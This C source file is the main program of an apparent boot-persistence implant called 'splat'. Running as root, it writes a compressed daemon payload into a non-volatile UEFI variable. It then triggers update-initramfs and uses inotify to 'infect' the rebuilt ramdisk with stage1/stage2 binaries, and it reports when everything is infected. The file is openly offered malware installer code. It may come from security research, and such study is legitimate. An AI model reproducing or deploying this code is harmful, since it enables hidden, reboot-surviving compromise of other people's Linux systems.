#define _GNU_SOURCE

#include "stage2.h"
#include "stage2d.h"
#include "stage1.h"
#include "order.h"

#include "efi_stuff.h"
#include "infect.h"
#include "mlog.h"

#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <poll.h>
#include <stdint.h>
#include <strings.h>
#include <dirent.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>

/*
 * comment out to not use EUFI and instead jam the daemon directly
 * into the ramdisk
 */
#define UEFI 1


static void handle_usr1(int signum)
{
	printf("everything should be infected now.  Have a nice day\n");
	exit(EXIT_SUCCESS);
}

static int filter(const struct dirent *name) {
    const char needle[] = "vmlinuz-";
    int rc = 0;

    if (strstr(name->d_name, needle) != NULL) {
        rc = 1;
    }
    return rc;
}

static int find_latest_kernel_version(char *buf, size_t len) {
    struct dirent **namelist;
    int n;
    char *version;
    int rc = -1;

    if (buf == NULL || len == 0) {
        goto out;
    }

    n = scandir("/boot", &namelist, filter, versionsort);
    if (n == -1) {
        mlog(LFAIL, "scandir: %s", strerror(errno));
        goto out;
    }
    if (n == 0) {
        goto out;
    }

    version = index(namelist[n-1]->d_name, '-');
    strncpy(buf, version+1, len);

    while (n--) {
        free(namelist[n]);
    }
    free(namelist);

    rc = 0;

 out:
    return rc;

}

static int write_var(char *name, uint8_t* contents, size_t size)
{
    char filename[1024];
    uint8_t *buffer;
    size_t buff_size;
    int fd;
    int rc = -1;
    uint32_t attributes = EFI_VARIABLE_RUNTIME_ACCESS |
        EFI_VARIABLE_BOOTSERVICE_ACCESS |
        EFI_VARIABLE_NON_VOLATILE;

    snprintf(filename, sizeof(filename), "%s%s-%s", EFIVARS, name, GUID);

    buff_size = size + sizeof(int32_t);
    buffer = (uint8_t*)malloc(buff_size);
    if (!buffer) {
        goto out;
    }
    mlog(LINFO, "using filename \"%s\"", filename);
    mlog(LINFO, "contents should be %ld bytes", size);
    mlog(LINFO, "to view: hd \"%s\"", filename);
    mlog(LINFO, "to remove: chattr -i \"%s\" && rm -rv \"%s\"", filename, filename);
    fd = open(filename,
              O_WRONLY | O_CREAT | O_EXCL,
              S_IRUSR|S_IWUSR|S_IRGRP|S_IROTH);
    if (!fd) {
        mlog(LFAIL, "open: %s", strerror(errno));
        goto out;
    }
    memcpy(buffer, &attributes, sizeof(attributes));
    memcpy(buffer + sizeof(attributes), contents, size);

    rc = write(fd, buffer,  buff_size);
    if (rc < buff_size) {
        mlog(LFAIL, "wrote %d instead of %d bytes: %s",
             rc, buff_size, strerror(errno));
    }

    close(fd);
    rc = 0;

 out:
    if (buffer) {
        free(buffer);
    }
    return rc;
}

int main(int argc, char **argv)
{
    int rc;
    struct pollfd pollfds[1];
    pid_t update_pid;
    if (getuid() != 0) {
        printf("you must run as root\n");
        goto out;
    }

    log_init("splat");


    if (write_var(NAME, stage2d_gz, stage2d_gz_len) < 0) {
        mlog(LFAIL, "write_var");
        goto out;
    }


#ifndef UEFI
    exe.buf = stage2;
    exe.len = stage2_len;
#else
    exe.buf = stage1;
    exe.len = stage1_len;
#endif
    script.buf = ORDER;
    script.len = ORDER_len;

    update_pid = fork();
    if (update_pid < 0) {
        perror("fork");
        goto out;
    } else if (update_pid == 0) {
        /* child */
        char version[PATH_MAX];
        char cmd[PATH_MAX];

        if (nice(10) < 0) {
            goto out;
        }
        sleep(1);

        printf("updating ramdisk images...\n");
        fflush(stdout);
        close(1);
        close(2);
        open("/dev/null", O_WRONLY);
        open("/dev/null", O_RDWR);

        rc = find_latest_kernel_version(version, sizeof(version));
        if (rc < 0) {
            goto out;
        }
        snprintf(cmd, sizeof(cmd),
                 "sh -c 'update-initramfs -k %s -u 2>&1 > /dev/null'",
                 version);
        if (system(cmd) < 0) {
            goto out;
        }
        printf("done!\n");
        kill(getppid(), SIGUSR1);
        goto success;
    }

    signal(SIGUSR1, handle_usr1);

    if (infect_init() < 0) {
        perror("could not initialize structure");
        goto out;
    }
    pollfds[0].fd = infect_get_inotify_fd();
    pollfds[0].events = POLLIN | POLLNVAL;

    while (1) {
        rc = poll(pollfds, 1, 10);
        if (rc < 0) {
            perror("error in poll");
            goto out;
        } else if (rc == 0) {
            int status;
            pid_t pid;

            pid = waitpid(update_pid, &status, WNOHANG);
            if (pid < 0) {
                perror("waitpid");
                goto out;
            } else if (pid == update_pid) {
                printf("everything should be infected now.  Have a nice day\n");
                break;
            }
        } else if (pollfds[0].revents & POLLIN) {
            /* Inotify events are available */
            infect_handle_inotify();
        }

    }

 success:
    exit(EXIT_SUCCESS);

 out:
    exit(EXIT_FAILURE);

    return 0;
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 4
 * tab-width: 8
 * indent-tabs-mode: nil
 * End:
 *
 * vi: set shiftwidth=4 tabstop=8 expandtab:
 * :indentSize=4:tabSize=8:noTabs=true:
 */
